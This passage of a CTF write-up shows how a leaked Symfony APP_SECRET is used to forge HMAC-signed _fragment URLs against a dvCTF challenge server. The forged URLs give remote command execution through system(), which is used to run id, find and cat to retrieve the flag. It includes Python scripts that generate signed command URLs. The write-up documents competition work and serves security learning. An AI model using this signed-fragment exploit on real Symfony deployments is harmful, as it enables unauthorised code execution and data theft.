&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# APP_SECRET exposed from phpinfo: 60b938ad59ac73568c7f2d6c282cd084&lt;/span&gt;

&lt;span class="c1"&gt;# calculate HMAC with secret and URL&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;hmac&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;hashlib&lt;/span&gt;
&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hmac&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HMAC&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;60b938ad59ac73568c7f2d6c282cd084&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://challs.dvc.tf:9000/_fragment&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sha256&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;digest&lt;/span&gt;&lt;span class="p"&gt;()))&lt;/span&gt;
&lt;span class="c1"&gt;# b&amp;#39;fyV4XdLD0haRSGyIJA4CMbbai6jSknB09Tk+CE2/i/k=&amp;#39;&lt;/span&gt;

&lt;span class="c1"&gt;# add calculated HMAC to request&lt;/span&gt;
&lt;span class="c1"&gt;# http://challs.dvc.tf:9000/_fragment?_hash=fyV4XdLD0haRSGyIJA4CMbbai6jSknB09Tk+CE2/i/k=    &lt;/span&gt;

&lt;span class="c1"&gt;# url encode&lt;/span&gt;
&lt;span class="c1"&gt;# http://challs.dvc.tf:9000/_fragment?_hash=fyV4XdLD0haRSGyIJA4CMbbai6jSknB09Tk%2BCE2%2Fi%2Fk%3D&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Now the webserver returns HTTP 404 instead of 403:
 &lt;img alt="grafik" src="https://user-images.githubusercontent.com/3590155/158146959-6556a5fe-4083-4f94-810a-1e058f1dba1a.png"&gt;&lt;/p&gt;
&lt;h3&gt;Remote code execution&lt;/h3&gt;
&lt;p&gt;We now know that we can properly calculate the HMAC so we try to run some code on the server:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# calculate HMAC for call to system(&amp;quot;id&amp;quot;, null) which would be called with&lt;/span&gt;
&lt;span class="c1"&gt;# http://challs.dvc.tf:9000/_fragment?_path=_controller=system&amp;amp;command=id&amp;amp;return_value=null&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;hmac&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;hashlib&lt;/span&gt;
&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hmac&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HMAC&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;60b938ad59ac73568c7f2d6c282cd084&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://challs.dvc.tf:9000/_fragment?_path=_controller%3Dsystem&lt;/span&gt;&lt;span class="si"&gt;%26c&lt;/span&gt;&lt;span class="s1"&gt;ommand%3Did&lt;/span&gt;&lt;span class="si"&gt;%26r&lt;/span&gt;&lt;span class="s1"&gt;eturn_value%3Dnull&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sha256&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;digest&lt;/span&gt;&lt;span class="p"&gt;()))&lt;/span&gt;
&lt;span class="c1"&gt;# b&amp;#39;KMwS5Oc86Op3T32GVDjKUlzlRcWrqAkXP/HpBI50WiE=&amp;#39;&lt;/span&gt;

&lt;span class="c1"&gt;# Append hash to url&lt;/span&gt;
&lt;span class="c1"&gt;# http://challs.dvc.tf:9000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&amp;amp;_hash=KMwS5Oc86Op3T32GVDjKUlzlRcWrqAkXP%2FHpBI50WiE%3D&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;img width="1461" alt="grafik" src="https://user-images.githubusercontent.com/3590155/158147275-14d08b2d-8e6f-4fd5-aec9-997388f24a23.png"&gt;&lt;/p&gt;
&lt;p&gt;We can see the result of running id by calling &lt;code&gt;system($command)&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;Retrieving the flag&lt;/h3&gt;
&lt;p&gt;Now let's use find to find the flag.
Using the following script we can generate URLs for running arbitrary commands on the server:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;hmac&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;hashlib&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;urllib.parse&lt;/span&gt;

&lt;span class="n"&gt;appSecret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;60b938ad59ac73568c7f2d6c282cd084&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;baseUrl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://challs.dvc.tf:9000/_fragment?_path=_controller%3D&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;system&amp;amp;command=find&lt;/span&gt;&lt;span class="si"&gt;%20%&lt;/span&gt;&lt;span class="s2"&gt;2F%20-name&lt;/span&gt;&lt;span class="si"&gt;%20f&lt;/span&gt;&lt;span class="s2"&gt;lag.%2A&amp;amp;return_value=null&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;fullUrl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;baseUrl&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;parse&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;quote&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nb"&gt;hash&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hmac&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HMAC&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;60b938ad59ac73568c7f2d6c282cd084&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fullUrl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;UTF-8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sha256&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;digest&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;print(fullUrl + '&amp;amp;_hash=' + urllib.parse.quote(hash))&lt;/p&gt;
&lt;p&gt;This gives us the URL &lt;code&gt;http://challs.dvc.tf:9000/_fragment?_path=_controller%3Dsystem%26command%3Dfind%2520%252F%2520-name%2520flag.%252A%26return_value%3Dnull&amp;amp;_hash=fQFSkmoPF7cmMBKMyTUdOJGkIIGKuWJKi3NOK7lA2HI%3D&lt;/code&gt; which reveals the flag&lt;/p&gt;
&lt;p&gt;&lt;img width="624" alt="grafik" src="https://user-images.githubusercontent.com/3590155/158148800-5b27b50e-0f42-4439-ac5d-d3cc472da4c9.png"&gt;&lt;/p&gt;
&lt;p&gt;So we create a new URL by replacing the command with &lt;code&gt;"system&amp;amp;command=cat%20%2Fvar%2Fwww%2Fhtml%2Fchall%2Fflag.txt%20&amp;amp;return_value=null"&lt;/code&gt;.
The new URL is &lt;code&gt;http://challs.dvc.tf:9000/_fragment?_path=_controller%3Dsystem%26command%3Dcat%2520%252Fvar%252Fwww%252Fhtml%252Fchall%252Fflag.txt%2520%26return_value%3Dnull&amp;amp;_hash=3gkvuAFZrCeS0a0xE51myb6xBQejXT3x0uZRJi0GcK8%3D&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img width="624" alt="grafik" src="https://user-images.githubusercontent.com/3590155/158149072-1a4bc591-3de1-4ec5-bd3b-91fb82c75d64.png"&gt;&lt;/p&gt;
&lt;p&gt;Entering this URL in the browser gives us the flag &lt;code&gt;dvCTF{1c5b0abc99b19effaacd1aa7d6ec28f8}&lt;/code&gt;&lt;/p&gt;</content><category term="CTF writeups"></category><category term="web"></category></entry></feed>